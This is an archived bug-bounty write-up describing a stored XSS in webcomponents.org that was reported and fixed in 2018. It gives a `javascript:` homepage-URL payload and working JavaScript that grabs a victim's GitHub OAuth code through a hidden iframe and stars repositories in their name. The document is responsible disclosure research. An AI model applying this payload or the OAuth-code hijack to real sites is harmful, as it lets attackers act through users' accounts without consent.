---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-08-23_liking-github-repositories-on-behalf-of-other-users-stored-xss-in-webcomponentso.md
original_filename: 2018-08-23_liking-github-repositories-on-behalf-of-other-users-stored-xss-in-webcomponentso.md
title: Liking GitHub repositories on behalf of other users — Stored XSS in WebComponents.org
category: documents
detected_topics:
- oauth
- xss
- access-control
- command-injection
tags:
- imported
- documents
- oauth
- xss
- access-control
- command-injection
language: en
raw_sha256: 8686dcf7535bfb235ab6dbd2f71deb7a39ee01cba7d350554d53bee5e7e6c768
text_sha256: 6dcfd394b9e9629183487d161a6427a89d6f37105e1429b70463562e69cc9f1e
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Liking GitHub repositories on behalf of other users — Stored XSS in WebComponents.org

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-08-23_liking-github-repositories-on-behalf-of-other-users-stored-xss-in-webcomponentso.md
- Source Type: markdown
- Detected Topics: oauth, xss, access-control, command-injection
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `8686dcf7535bfb235ab6dbd2f71deb7a39ee01cba7d350554d53bee5e7e6c768`
- Text SHA256: `6dcfd394b9e9629183487d161a6427a89d6f37105e1429b70463562e69cc9f1e`


## Content

---
title: "Liking GitHub repositories on behalf of other users — Stored XSS in WebComponents.org"
page_title: "Liking GitHub repositories on behalf of other users — Stored XSS in WebComponents.org - Web Security Blog"
url: "https://websecblog.com/vulns/stored-xss-in-webcomponents-org/"
final_url: "https://websecblog.com/vulns/stored-xss-in-webcomponents-org/"
authors: ["Thomas Orlita (@ThomasOrlita)"]
programs: ["Webcomponents.org"]
bugs: ["Stored XSS"]
publication_date: "2018-08-23"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5742
---

# Liking GitHub repositories on behalf of other users — Stored XSS in WebComponents.org

[![](https://secure.gravatar.com/avatar/7f8a61ba947af5eb2a9b491c4dacb5f1b6952c86727d08f85d3b10e901d8e253?s=24&d=mm&r=g)](https://websecblog.com/author/admin/)by [Thomas Orlita](https://websecblog.com/author/admin/)[Vulnerabilities](https://websecblog.com/category/vulns/)[August 23, 2018February 16, 2022](https://websecblog.com/vulns/stored-xss-in-webcomponents-org/)

**Video:**

**Steps to reproduce:**

1\. Create a Polymer element and publish it to github  
2\. Set the repo homepage URL to: `javascript:alert(document.domain)`  
3\. Publish it via [https://www.webcomponents.org/publish](https://www.google.com/url?q=https://www.webcomponents.org/publish&sa=D&usg=AFQjCNHIsV9n3NiEyrf6scAZbAO8KftljQ)  
4\. Go to the element’s [webcomponents.org](https://www.google.com/url?q=http://webcomponents.org&sa=D&usg=AFQjCNELXBgrR5GCm7OTqeCFcbqDGQsQxg) page and click the homepage link

[![](https://websecblog.com/wp-content/uploads/2018/08/webcomponents-org-xss-e1538904321140.png)](https://websecblog.com/wp-content/uploads/2018/08/webcomponents-org-xss-e1538904321140.png)

**What you can do with this XSS:**

If the user has authenticated using Github on [webcomponents.org](https://www.google.com/url?q=http://webcomponents.org&sa=D&usg=AFQjCNELXBgrR5GCm7OTqeCFcbqDGQsQxg) before, it’s possible to get the Github auth code and use it to star any public Github repo behalf of the user.

It would work like this:

  * Create an iframe with the GitHub auth URL.  
If the user is already authenticated, it redirects us to [webcomponents.org](https://www.google.com/url?q=http://webcomponents.org&sa=D&usg=AFQjCNELXBgrR5GCm7OTqeCFcbqDGQsQxg).  
It will have the auth code in the url as `?code=123` (and we can access the iframe because it’s same origin).
  * Use the code to post a request to [webcomponents.org](https://www.google.com/url?q=http://webcomponents.org&sa=D&usg=AFQjCNELXBgrR5GCm7OTqeCFcbqDGQsQxg)‘s API to star any GitHub repository using the user’s account

Here’s an example:
  
  
  // create an iframe with github authorization url
  // that redirects us back to webcomponents.org
  var iframe;
  iframe = document.createElement('iframe');
  iframe.src = 'https://github.com/login/oauth/authorize?client_id=54fc42e15038794b7011&scope=public_repo&redirect_uri=https://www.webcomponents.org/element/ThomasOrlita/test2';
  iframe.style.display = 'none';
  document.body.appendChild(iframe);
  
  // just wait some time until it's loaded and redirected
  setTimeout(() => {
  console.log(iframe.contentWindow.location.href);
  // get the url that contains the authorization code from the iframe
  var url = new URL(iframe.contentWindow.location.href);
  var code = url.searchParams.get("code");
  
  // the github repo we want to star
  var repo_to_star = 'kelseyhightower/nocode';
  
  // make a post request using the code
  fetch('/api/star/' + repo_to_star + '?code=' + code, {
  method: 'POST'
  })
  
  }, 5000);

* * *

Timeline|  
---|---  
2018-08-12| Vulnerability reported  
2018-08-17| Added more info  
2018-08-20| Nice catch  
2018-08-22| Fixed  
2018-08-29| Reward issued  
  
Written by [Thomas Orlita](https://thomasorlita.com/)
